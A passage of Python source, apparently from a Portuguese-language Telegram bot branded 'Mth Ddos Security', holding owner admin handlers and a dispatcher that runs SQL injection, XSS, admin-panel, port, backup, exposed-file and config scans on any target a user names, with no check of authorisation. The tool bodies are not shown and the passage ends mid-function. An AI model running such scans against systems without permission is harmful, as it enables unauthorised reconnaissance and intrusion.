def handle_stats(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: View stats of a specific user or all users"""
    log_user(user_id, username, first_name, last_name)

    if not is_owner(user_id):
        send_message_safe(chat_id, "🚫 <b>Acesso negado!</b> Este comando é restrito aos donos do bot.")
        return

    log_owner_command(user_id, username, "stats")

    # If args provided, search for specific user
    if args:
        search_term = ' '.join(args)
        try:
            user_data = []
            with sqlite3.connect(DB_PATH) as conn:
                conn.row_factory = sqlite3.Row
                c = conn.cursor()
                # Search by username or user_id
                c.execute("SELECT * FROM users WHERE username LIKE ? OR id = ? ORDER BY command_count DESC",
                          (f"%{search_term}%", search_term))
                rows = c.fetchall()

                if not rows:
                    send_message_safe(chat_id, f"🔍 Nenhum usuário encontrado para: {escape_html(search_term)}")
                    return

                msg = f"📊 <b>Estatísticas — Buscar: {escape_html(search_term)}</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
                for r in rows[:10]:
                    d = dict(r)
                    msg += f"\n<b>@{escape_html(d['username'] or 'N/D')}</b> (ID: {d['id']})\n"
                    msg += f"  Nome: {escape_html(d['first_name'])} {escape_html(d['last_name'] or '')}\n"
                    msg += f"  Comandos: {d['command_count']}\n"
                    msg += f"  Dono: {'Sim' if d['is_owner'] else 'Não'}\n"
                    msg += f"  Primeiro acesso: {d['first_seen']}\n"
                    msg += f"  Último acesso: {d['last_seen']}\n"
                    # Get user's top commands (still inside with block)
                    c2 = conn.cursor()
                    c2.execute("SELECT command, COUNT(*) as cnt FROM logs WHERE user_id = ? GROUP BY command ORDER BY cnt DESC LIMIT 3",
                               (d['id'],))
                    top_cmds = c2.fetchall()
                    if top_cmds:
                        top_parts = []
                        for dd in top_cmds:
                            ddd = dict(dd)
                            top_parts.append(f"/{ddd['command']}({ddd['cnt']}x)")
                        msg += f"  Top comandos: {', '.join(top_parts)}\n"

            send_message_safe(chat_id, msg[:4000])
        except Exception as e:
            print(f"[DB Error] handle_stats: {e}")
            log_error("stats", str(e))
            send_message_safe(chat_id, "❌ Erro ao buscar estatísticas.")
    else:
        # General stats
        stats = get_user_stats()
        uptime_secs = int(time.time() - BOT_START_TIME)
        hours, mins, secs = uptime_secs // 3600, (uptime_secs % 3600) // 60, uptime_secs % 3600 % 60

        # Top 10 users by command count
        try:
            with sqlite3.connect(DB_PATH) as conn:
                conn.row_factory = sqlite3.Row
                c = conn.cursor()
                c.execute("SELECT username, command_count FROM users ORDER BY command_count DESC LIMIT 10")
                top_users = [dict(r) for r in c.fetchall()]
        except:
            top_users = []

        msg = f"""📊 <b>MTH Security v5.1 — Estatísticas</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>📈 Gerais:</b>
👥 Total de usuários: {stats['total']}
👑 Donos: {stats['owners']}
👤 Regulares: {stats['regular']}
📝 Comandos registrados: {stats['commands']}
⏱️ Uptime: {hours}h {mins}m {secs}s
🚫 Banidos: {len(BANNED_USERS)}
📦 Cache: {len(RESULT_CACHE)} entradas

<b>🏆 Top 10 Usuários (mais ativos):</b>"""

        for i, u in enumerate(top_users, 1):
            msg += f"\n  {i}. @{escape_html(u['username'] or 'N/D')} — {u['command_count']} comandos"

        send_message_safe(chat_id, msg)


def handle_ban(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: Ban a user from using the bot"""
    log_user(user_id, username, first_name, last_name)

    if not is_owner(user_id):
        send_message_safe(chat_id, "🚫 <b>Acesso negado!</b> Este comando é restrito aos donos do bot.")
        return

    log_owner_command(user_id, username, "ban")

    if not args:
        send_message_safe(chat_id, "❌ Use: /ban &lt;user_id&gt; [motivo]\nExemplo: /ban 123456789 Spam de comandos")
        return

    target_id = int(args[0]) if args[0].isdigit() else None
    if not target_id:
        send_message_safe(chat_id, "❌ ID inválido. Use o número do ID do usuário.")
        return

    if target_id in OWNERS:
        send_message_safe(chat_id, "🚫 <b>Não é possível banir um dono!</b>")
        return

    reason = ' '.join(args[1:]) if len(args) > 1 else "Sem motivo especificado"
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT OR REPLACE INTO banned_users (user_id, username, reason, banned_at, banned_by) VALUES (?, ?, ?, ?, ?)",
                      (target_id, args[0], reason, now, user_id))
            conn.commit()

        BANNED_USERS.add(target_id)

        # Try to get username
        try:
            resp = HTTP_SESSION.get(f"{API_URL}/getChat", json={"chat_id": target_id}, timeout=5)
            if resp.status_code == 200:
                chat_data = resp.json().get('result', {})
                target_user = chat_data.get('username', f"ID {target_id}")
            else:
                target_user = f"ID {target_id}"
        except:
            target_user = f"ID {target_id}"

        send_message_safe(chat_id, f"✅ <b>Usuário banido!</b>\n👤 {escape_html(target_user)}\n📝 Motivo: {escape_html(reason)}")
    except Exception as e:
        print(f"[DB Error] handle_ban: {e}")
        log_error("ban", str(e))
        send_message_safe(chat_id, "❌ Erro ao banir usuário.")


def handle_unban(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: Unban a user"""
    log_user(user_id, username, first_name, last_name)

    if not is_owner(user_id):
        send_message_safe(chat_id, "🚫 <b>Acesso negado!</b> Este comando é restrito aos donos do bot.")
        return

    log_owner_command(user_id, username, "unban")

    if not args or not args[0].isdigit():
        send_message_safe(chat_id, "❌ Use: /unban &lt;user_id&gt;\nExemplo: /unban 123456789")
        return

    target_id = int(args[0])

    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("DELETE FROM banned_users WHERE user_id = ?", (target_id,))
            conn.commit()

        BANNED_USERS.discard(target_id)

        send_message_safe(chat_id, f"✅ <b>Usuário desbanido!</b>\nID: {target_id}")
    except Exception as e:
        print(f"[DB Error] handle_unban: {e}")
        log_error("unban", str(e))
        send_message_safe(chat_id, "❌ Erro ao desbanir usuário.")


def handle_export(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: Export user list to TXT file"""
    log_user(user_id, username, first_name, last_name)

    if not is_owner(user_id):
        send_message_safe(chat_id, "🚫 <b>Acesso negado!</b> Este comando é restrito aos donos do bot.")
        return

    log_owner_command(user_id, username, "export")

    send_message_safe(chat_id, "⏳ <b>Exportando lista de usuários...</b>")

    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            c.execute("SELECT * FROM users ORDER BY command_count DESC")
            users = [dict(r) for r in c.fetchall()]
    except Exception as e:
        print(f"[DB Error] handle_export: {e}")
        log_error("export", str(e))
        send_message_safe(chat_id, "❌ Erro ao exportar lista.")
        return

    if not users:
        send_message_safe(chat_id, "ℹ️ Nenhum usuário encontrado.")
        return

    export_text = "Mth Ddos Security - Exportação de Usuários\n"
    export_text += f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    export_text += f"Total: {len(users)} usuários\n"
    export_text += "=" * 60 + "\n\n"

    for u in users:
        export_text += f"ID: {u['id']} | @{u['username'] or 'N/D'} | {u['first_name']} {u['last_name'] or ''} | "
        export_text += f"Owner: {'Sim' if u['is_owner'] else 'Não'} | "
        export_text += f"Cmds: {u['command_count']} | "
        export_text += f"First: {u['first_seen']} | Last: {u['last_seen']}\n"

    # Use send_document helper which has its own error handling
    success = send_document(chat_id, export_text, "users_export.txt")
    if success:
        send_message_safe(chat_id, f"✅ <b>Exportação concluída!</b>\n📤 {len(users)} usuários exportados.")
    else:
        send_message_safe(chat_id, "❌ Falha ao enviar o arquivo.")


def handle_listdn(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: List all owner-exclusive commands"""
    log_user(user_id, username, first_name, last_name)

    if not is_owner(user_id):
        send_message_safe(chat_id, "🚫 <b>Acesso negado!</b> Este comando é restrito aos donos do bot.")
        return

    log_owner_command(user_id, username, "listdn")

    msg = """👑 <b>Comandos de Dono — Mth Ddos v5.1</b>
━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Administrativos:</b>
  /botpanel — Painel de estatísticas do bot
  /stats [username] — Stats gerais ou busca por usuário
  /logs — Últimos comandos executados
  /logs user:&lt;id&gt; — Comandos de um usuário específico
  /log &lt;user_id&gt; — Audit logs detalhados
  /log audit — Audit log geral
  /clearlogs — Limpar logs antigos
  /top — Top sites mais escaneados

🔧 <b>Gerenciamento:</b>
  /maintenance [on/off/mensagem] — Modo manutenção
  /cooldown &lt;user_id&gt; &lt;limite&gt; — Rate limit custom
  /vip add/remove &lt;user_id&gt; — Gerenciar VIPs

📢 <b>Broadcast:</b>
  /msg &lt;texto&gt; — Enviar mensagem pra todos
  /msg &lt;texto&gt; (responder sticker) — Enviar sticker + mensagem
  /msg &lt;texto&gt; (responder foto) — Enviar foto + legenda
  /msg &lt;texto&gt; (responder GIF) — Enviar GIF + legenda
  /msg &lt;texto&gt; (responder vídeo) — Enviar vídeo + legenda
  /broadcast &lt;min&gt; &lt;texto&gt; — Agendar broadcast

👥 <b>Usuários:</b>
  /export — Exportar lista de usuários pra TXT
  /ban &lt;id&gt; [motivo] — Banir usuário do bot
  /unban &lt;id&gt; — Desbanir usuário

📋 <b>Outros:</b>
  /listdn — Mostrar esta lista (este comando)
  /bancodds — Dump do banco de dados

━━━━━━━━━━━━━━━━━━━━━━
  🔒 Exclusivo para donos do bot"""

    send_message_safe(chat_id, msg)


def handle_uptime(chat_id, user_id, username, first_name, last_name, args):
    """Show bot uptime (available to everyone)"""
    log_user(user_id, username, first_name, last_name)

    uptime_secs = int(time.time() - BOT_START_TIME)
    days = uptime_secs // 86400
    hours = (uptime_secs % 86400) // 3600
    mins = (uptime_secs % 3600) // 60
    secs = uptime_secs % 60

    msg = f"""⏱️ <b>MTH Security v5.1 — Uptime</b>
━━━━━━━━━━━━━━━━━━━━━━

🟢 <b>Online há:</b>
"""
    if days > 0:
        msg += f"  {days} dias, "
    msg += f"{hours} horas, {mins} minutos e {secs} segundos\n"
    msg += f"\n📅 Iniciado em: {datetime.fromtimestamp(BOT_START_TIME).strftime('%d/%m/%Y %H:%M:%S')}\n"
    msg += f"⏰ Agora: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n"
    msg += "━━━━━━━━━━━━━━━━━━━━━━"

    send_message_safe(chat_id, msg)


def handle_status(chat_id, user_id, username, first_name, last_name, args):
    """Quick health check and bot status"""
    log_user(user_id, username, first_name, last_name)
    uptime_secs = int(time.time() - BOT_START_TIME)
    hours, mins, secs = uptime_secs // 3600, (uptime_secs % 3600) // 60, uptime_secs % 60
    stats = get_user_stats()
    # Gather system info
    try:
        import resource
        mem_mb = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss / 1024  # KB to MB
    except:
        mem_mb = 0
    try:
        db_size = os.path.getsize(DB_PATH) / 1024 if os.path.exists(DB_PATH) else 0
    except:
        db_size = 0
    active_threads = threading.active_count()

    msg = f"""📊 <b>Mth Ddos Security v4.3 — Status</b>
━━━━━━━━━━━━━━━━━━━━━━
🟢 <b>Online</b> | Uptime: {hours}h {mins}m {secs}s
👥 Usuários: {stats['total']} (Donos: {stats['owners']})
📝 Comandos registrados: {stats['commands']}
💾 RAM usada: {mem_mb:.1f} MB
🧵 Threads ativas: {active_threads}
🗃️ Banco: {db_size:.1f} KB
━━━━━━━━━━━━━━━━━━━━━━"""
    send_message_safe(chat_id, msg)


def handle_feedback(chat_id, user_id, username, first_name, last_name, args):
    """Send feedback to the channel. Available to everyone."""
    log_user(user_id, username, first_name, last_name)

    if not args:
        send_message_safe(chat_id, "❌ Use: /feedback &lt;sua mensagem&gt;\nExemplo: /feedback Bot está muito rápido!")
        return

    message_text = ' '.join(args)
    log_command(user_id, username, "feedback", "")

    # Count existing feedbacks from this user for ID
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM feedback WHERE user_id = ?", (user_id,))
            user_feedback_count = c.fetchone()[0] + 1
    except:
        user_feedback_count = 1

    # Send to channel
    channel_msg_id = send_feedback_to_channel(user_id, username, first_name, message_text, "feedback")

    # Save to DB
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT INTO feedback (user_id, username, first_name, message, timestamp, channel_msg_id) VALUES (?, ?, ?, ?, ?, ?)",
                      (user_id, username, first_name, message_text, now, channel_msg_id))
            conn.commit()
    except Exception as e:
        print(f"[DB Error] handle_feedback: {e}")

    msg = f"""━━━━━━━━━━━━━━━━━━━━━━
🔰 ✅ FEEDBACK ENVIADO
━━━━━━━━━━━━━━━━━━━━━━
│ Obrigado, {escape_html(first_name)}!
│ Sua mensagem foi registrada com sucesso.
│ ID do feedback: #{user_feedback_count}
━━━━━━━━━━━━━━━━━━━━━━"""
    send_message_safe(chat_id, msg)


def handle_report(chat_id, user_id, username, first_name, last_name, args):
    """Report a bug to the channel. Available to everyone."""
    log_user(user_id, username, first_name, last_name)

    if not args:
        send_message_safe(chat_id, "❌ Use: /report &lt;descrição do bug&gt;\nExemplo: /report /sqli não funciona com https")
        return

    message_text = ' '.join(args)
    log_command(user_id, username, "report", "")

    # Count existing reports from this user for ID
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM bug_reports WHERE user_id = ?", (user_id,))
            user_report_count = c.fetchone()[0] + 1
    except:
        user_report_count = 1

    # Send to channel
    channel_msg_id = send_feedback_to_channel(user_id, username, first_name, message_text, "report")

    # Save to DB
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT INTO bug_reports (user_id, username, first_name, message, timestamp, channel_msg_id) VALUES (?, ?, ?, ?, ?, ?)",
                      (user_id, username, first_name, message_text, now, channel_msg_id))
            conn.commit()
    except Exception as e:
        print(f"[DB Error] handle_report: {e}")

    msg = f"""━━━━━━━━━━━━━━━━━━━━━━
🐛 ✅ BUG REPORTADO
━━━━━━━━━━━━━━━━━━━━━━
│ Obrigado, {escape_html(first_name)}!
│ Seu relatório de bug foi registrado.
│ ID do relatório: #{user_report_count}
│ Os donos serão notificados.
━━━━━━━━━━━━━━━━━━━━━━"""
    send_message_safe(chat_id, msg)


def handle_stop(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: Stop a running scan"""
    log_user(user_id, username, first_name, last_name)

    if not is_owner(user_id):
        send_message_safe(chat_id, "🚫 <b>Acesso negado!</b> Este comando é restrito aos donos do bot.")
        return

    log_owner_command(user_id, username, "stop")

    if args:
        # Stop a specific user's scan
        target_user_id = int(args[0]) if args[0].isdigit() else None
        if target_user_id and target_user_id in STOP_EVENTS:
            STOP_EVENTS[target_user_id].set()
            # Also stop in ACTIVE_SCANS
            for scan_id, event in list(ACTIVE_SCANS.items()):
                if str(target_user_id) in scan_id:
                    event.set()
            send_message_safe(chat_id, f"✅ <b>Scan do usuário {target_user_id} parado!</b>")
        else:
            send_message_safe(chat_id, f"❌ Nenhum scan ativo encontrado para o ID {target_user_id}.")
    else:
        # Show active scans
        if not STOP_EVENTS:
            send_message_safe(chat_id, "📋 <b>Nenhum scan ativo no momento.</b>")
            return

        msg = "📋 <b>Scans Ativos</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        for uid, event in STOP_EVENTS.items():
            msg += f"  👤 ID: {uid} — {'Rodando' if not event.is_set() else 'Parando...'}\n"
        msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
        msg += "Use /stop &lt;user_id&gt; para parar um scan específico."
        send_message_safe(chat_id, msg)


def handle_rescan(chat_id, user_id, username, first_name, last_name, args):
    """Handle inline button 'Rescan' callback"""
    log_user(user_id, username, first_name, last_name)

    if not args:
        send_message_safe(chat_id, "❌ Use: /rescan &lt;comando&gt; &lt;target&gt;\nExemplo: /rescan sqli example.com")
        return

    if len(args) < 2:
        send_message_safe(chat_id, "❌ Use: /rescan &lt;comando&gt; &lt;target&gt;\nExemplo: /rescan sqli example.com")
        return

    scan_cmd = '/' + args[0]
    target = args[1]
    scan_id = f"rescan_{user_id}_{time.time()}"

    # Set stop event
    STOP_EVENTS[user_id] = threading.Event()

    if scan_cmd == '/sqli':
        send_message_safe(chat_id, f"🔍 <b>Rescan SQLi</b> em {escape_html(target)}...")
        result = tool_sqli(target)
        db_cache_set("sqli", target, result)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/xss':
        send_message_safe(chat_id, f"🔍 <b>Rescan XSS</b> em {escape_html(target)}...")
        result = tool_xss_scanner(target)
        db_cache_set("xss", target, result)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/admin':
        send_message_safe(chat_id, f"🔍 <b>Rescan Admin</b> em {escape_html(target)}...")
        result = tool_admin_finder(target, chat_id, None)
        db_cache_set("admin", target, result)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/panel':
        send_message_safe(chat_id, f"🔍 <b>Rescan Painel Admin</b> em {escape_html(target)}...")
        progress_msg_id = send_progress(chat_id, scan_id, 0, 100, "Escaneando paths...")
        result = tool_admin_finder(target, chat_id, progress_msg_id)
        finish_progress(progress_msg_id, chat_id, result)
        db_cache_set("panel", target, result)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/ports':
        send_message_safe(chat_id, f"🔍 <b>Rescan Portas</b> em {escape_html(target)}...")
        result = tool_port_scanner(target)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/dirs':
        send_message_safe(chat_id, f"🔍 <b>Rescan Diretórios</b> em {escape_html(target)}...")
        result = tool_directory_scanner(target)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/sub':
        send_message_safe(chat_id, f"🔍 <b>Rescan Subdomínios</b> em {escape_html(target)}...")
        result = tool_subdomain_scanner(target)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/wp':
        send_message_safe(chat_id, f"🔍 <b>Rescan WordPress</b> em {escape_html(target)}...")
        result = tool_wordpress_scanner(target)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/dns':
        send_message_safe(chat_id, f"🔍 <b>Rescan DNS</b> de {escape_html(target)}...")
        result = tool_dns_tools(target)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/cms':
        send_message_safe(chat_id, f"🔍 <b>Rescan CMS</b> em {escape_html(target)}...")
        result = tool_cms_detector(target)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/reverse':
        send_message_safe(chat_id, f"🔍 <b>Rescan Reverse IP</b> de {escape_html(target)}...")
        result = tool_reverse_ip(target)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/ftpssh':
        send_message_safe(chat_id, f"🔍 <b>Rescan FTP/SSH</b> em {escape_html(target)}...")
        result = tool_ftp_ssh(target)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/info':
        send_message_safe(chat_id, f"🔍 <b>Rescan Info</b> de {escape_html(target)}...")
        result = tool_website_info(target)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/emails':
        send_message_safe(chat_id, f"🔍 <b>Rescan Emails</b> de {escape_html(target)}...")
        result = tool_email_scraper(target)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/ssl':
        send_message_safe(chat_id, f"🔍 <b>Rescan SSL</b> de {escape_html(target)}...")
        result = tool_ssl_audit(target)
        db_cache_set("ssl", target, result)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/headers':
        send_message_safe(chat_id, f"🔍 <b>Rescan Headers</b> de {escape_html(target)}...")
        result = tool_headers_analysis(target)
        db_cache_set("headers", target, result)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/cors':
        send_message_safe(chat_id, f"🔍 <b>Rescan CORS</b> de {escape_html(target)}...")
        result = tool_cors_test(target)
        db_cache_set("cors", target, result)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/robots':
        send_message_safe(chat_id, f"🔍 <b>Rescan Robots</b> de {escape_html(target)}...")
        result = tool_robots_txt(target)
        db_cache_set("robots", target, result)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/sitemap':
        send_message_safe(chat_id, f"🔍 <b>Rescan Sitemap</b> de {escape_html(target)}...")
        result = tool_sitemap(target)
        db_cache_set("sitemap", target, result)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/tech':
        send_message_safe(chat_id, f"🔍 <b>Rescan Tech</b> de {escape_html(target)}...")
        result = tool_tech_detect(target)
        db_cache_set("tech", target, result)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/exposed':
        send_message_safe(chat_id, f"🔍 <b>Rescan Exposed</b> de {escape_html(target)}...")
        result = tool_exposed_files(target)
        db_cache_set("exposed", target, result)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/backup':
        send_message_safe(chat_id, f"🔍 <b>Rescan Backup</b> de {escape_html(target)}...")
        result = tool_backup_finder(target)
        db_cache_set("backup", target, result)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/api':
        send_message_safe(chat_id, f"🔍 <b>Rescan API</b> de {escape_html(target)}...")
        result = tool_api_discovery(target)
        db_cache_set("api", target, result)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/shell':
        send_message_safe(chat_id, f"🔍 <b>Rescan Shell</b> de {escape_html(target)}...")
        result = tool_webshell_hunter(target)
        db_cache_set("shell", target, result)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/config':
        send_message_safe(chat_id, f"🔍 <b>Rescan Config</b> em {escape_html(target)}...")
        result = tool_config_scanner(target)
        db_cache_set("config", target, result)
        send_message_safe(chat_id, result)
    elif scan_cmd == '/scanall':
        send_message_safe(chat_id, f"🔍 <b>Rescan Completo</b> em {escape_html(target)}...")
        handle_scanall(chat_id, user_id, username, first_name, last_name, [target])
    elif scan_cmd == '/deep':
        send_message_safe(chat_id, f"🔍 <b>Rescan Deep</b> em {escape_html(target)}...")
        handle_deep(chat_id, user_id, username, first_name, last_name, [target])
    elif scan_cmd == '/quick':
        send_message_safe(chat_id, f"🔍 <b>Rescan Quick</b> em {escape_html(target)}...")
        handle_quick(chat_id, user_id, username, first_name, last_name, [target])
    elif scan_cmd == '/http':
        send_message_safe(chat_id, f"🔍 <b>Rescan HTTP</b> em {escape_html(target)}...")
        handle_http(chat_id, user_id, username, first_name, last_name, [target])
    elif scan_cmd == '/sslchain':
        send_message_safe(chat_id, f"🔍 <b>Rescan SSL Chain</b> em {escape_html(target)}...")
        handle_sslchain(chat_id, user_id, username, first_name, last_name, [target])
    elif scan_cmd == '/report':
        send_message_safe(chat_id, f"🔍 <b>Rescan Report</b> em {escape_html(target)}...")
        handle_report_url(chat_id, user_id, username, first_name, last_name, [target])
    else:
        send_message_safe(chat_id, f"❌ Comando /{args[0]} não suportado para rescan.")

    # Cleanup stop event
    if user_id in STOP_EVENTS:
        del STOP_EVENTS[user_id]


# ═══════════════════════════════════════════════════════════════
#  V5.0: NEW HANDLERS
# ═══════════════════════════════════════════════════════════════

def handle_ssl(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /ssl &lt;url&gt;\nExemplo: /ssl google.com")
        return
    target = args[0]
    log_command(user_id, username, "ssl", target)
    send_message_safe(chat_id, f"🔍 <b>Auditando SSL/TLS</b> em {escape_html(extract_hostname(target))}...")
    result = tool_ssl_audit(target)
    db_cache_set("ssl", target, result)
    send_message_safe(chat_id, result)

def handle_headers(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /headers &lt;url&gt;\nExemplo: /headers google.com")
        return
    target = args[0]
    log_command(user_id, username, "headers", target)
    send_message_safe(chat_id, f"🔍 <b>Analisando headers</b> em {escape_html(extract_hostname(target))}...")
    result = tool_headers_analysis(target)
    db_cache_set("headers", target, result)
    send_message_safe(chat_id, result)

def handle_cors(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /cors &lt;url&gt;\nExemplo: /cors google.com")
        return
    target = args[0]
    log_command(user_id, username, "cors", target)
    send_message_safe(chat_id, f"🔍 <b>Testando CORS</b> em {escape_html(extract_hostname(target))}...")
    result = tool_cors_test(target)
    db_cache_set("cors", target, result)
    send_message_safe(chat_id, result)

def handle_robots(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /robots &lt;url&gt;\nExemplo: /robots google.com")
        return
    target = args[0]
    log_command(user_id, username, "robots", target)
    send_message_safe(chat_id, f"🔍 <b>Analisando robots.txt</b> em {escape_html(extract_hostname(target))}...")
    result = tool_robots_txt(target)
    db_cache_set("robots", target, result)
    send_message_safe(chat_id, result)

def handle_sitemap(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /sitemap &lt;url&gt;\nExemplo: /sitemap google.com")
        return
    target = args[0]
    log_command(user_id, username, "sitemap", target)
    send_message_safe(chat_id, f"🔍 <b>Analisando sitemap</b> em {escape_html(extract_hostname(target))}...")
    result = tool_sitemap(target)
    db_cache_set("sitemap", target, result)
    send_message_safe(chat_id, result)

def handle_tech(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /tech &lt;url&gt;\nExemplo: /tech google.com")
        return
    target = args[0]
    log_command(user_id, username, "tech", target)
    send_message_safe(chat_id, f"🔍 <b>Detectando tecnologias</b> em {escape_html(extract_hostname(target))}...")
    result = tool_tech_detect(target)
    db_cache_set("tech", target, result)
    send_message_safe(chat_id, result)

def handle_exposed(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /exposed &lt;url&gt;\nExemplo: /exposed google.com")
        return
    target = args[0]
    log_command(user_id, username, "exposed", target)
    send_message_safe(chat_id, f"🔍 <b>Buscando arquivos expostos</b> em {escape_html(extract_hostname(target))}...")
    result = tool_exposed_files(target)
    db_cache_set("exposed", target, result)
    send_message_safe(chat_id, result)

def handle_backup(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /backup &lt;url&gt;\nExemplo: /backup google.com")
        return
    target = args[0]
    log_command(user_id, username, "backup", target)
    send_message_safe(chat_id, f"🔍 <b>Buscando backups</b> em {escape_html(extract_hostname(target))}...")
    result = tool_backup_finder(target)
    db_cache_set("backup", target, result)
    send_message_safe(chat_id, result)

def handle_api(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /api &lt;url&gt;\nExemplo: /api google.com")
        return
    target = args[0]
    log_command(user_id, username, "api", target)
    send_message_safe(chat_id, f"🔍 <b>Descobrindo APIs</b> em {escape_html(extract_hostname(target))}...")
    result = tool_api_discovery(target)
    db_cache_set("api", target, result)
    send_message_safe(chat_id, result)

def handle_shell(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /shell &lt;url&gt;\nExemplo: /shell google.com")
        return
    target = args[0]
    log_command(user_id, username, "shell", target)
    send_message_safe(chat_id, f"🔍 <b>Huntando webshells</b> em {escape_html(extract_hostname(target))}...")
    result = tool_webshell_hunter(target)
    db_cache_set("shell", target, result)
    send_message_safe(chat_id, result)

def handle_config(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /config &lt;url&gt;\nExemplo: /config google.com")
        return
    target = args[0]
    log_command(user_id, username, "config", target)
    send_message_safe(chat_id, f"🔍 <b>Buscando configs expostas</b> em {escape_html(extract_hostname(target))}...")
    result = tool_config_scanner(target)
    db_cache_set("config", target, result)
    send_message_safe(chat_id, result)

def handle_traceroute(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /traceroute &lt;ip&gt;\nExemplo: /traceroute 8.8.8.8")
        return
    target = args[0]
    log_command(user_id, username, "traceroute", target)
    clean_target = extract_hostname(target)
    send_message_safe(chat_id, f"🔍 <b>Traceroute</b> para {escape_html(clean_target)}...")
    try:
        # Try using traceroute/tracert command
        if os.name == 'nt':
            result = subprocess.run(['tracert', '-d', '-w', '2000', '-h', '15', clean_target], capture_output=True, text=True, timeout=30)
        else:
            result = subprocess.run(['traceroute', '-n', '-w', '2', '-m', '15', clean_target], capture_output=True, text=True, timeout=30)
        output = result.stdout.strip()
        if output:
            lines = output.split('\n')[:15]
            msg = f"🛣️ <b>Traceroute</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n<code>" + escape_html('\n'.join(lines)) + "</code>\n━━━━━━━━━━━━━━━━━━━━━━"
            send_message_safe(chat_id, msg)
        else:
            send_message_safe(chat_id, "❌ Traceroute não disponível neste servidor.")
    except subprocess.TimeoutExpired:
        send_message_safe(chat_id, "⏱️ Traceroute expirou (timeout 30s).")
    except Exception as e:
        send_message_safe(chat_id, f"❌ Erro: {escape_html(str(e))}")

def handle_whois(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /whois &lt;domain&gt;\nExemplo: /whois google.com")
        return
    target = args[0]
    domain = extract_hostname(target)
    log_command(user_id, username, "whois", domain)
    send_message_safe(chat_id, f"🔍 <b>Whois</b> de {escape_html(domain)}...")
    results = f"📋 <b>Whois</b> — {escape_html(domain)}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    try:
        resp = _safe_get(f"https://api.allorigins.win/raw?url=https://www.whois.com/whois/{domain}", timeout=10)
